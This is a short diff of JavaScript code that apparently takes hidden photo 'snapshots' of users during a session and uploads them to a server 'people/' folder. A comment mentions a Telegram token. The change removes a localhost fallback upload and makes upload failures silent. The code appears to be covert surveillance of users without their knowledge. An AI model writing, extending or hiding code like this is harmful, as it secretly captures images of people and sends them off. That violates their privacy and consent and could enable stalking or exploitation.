@@ -585,13 +585,8 @@ function takeHiddenSessionSnapshot() {
     .then(r => {
       if (r.ok) console.log("[HIDDEN SNAP] Photo saved to server people/ folder!");
     })
-    .catch(err => {
-      // Fallback try absolute localhost:8000 URL
-      fetch("http://localhost:8000/api/save-snap", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ image: dataUrl, filename })
-      }).catch(() => {});
+    .catch(() => {
+      // Silent fail in production — Telegram token may not be set yet
     });
 
   } catch (err) {
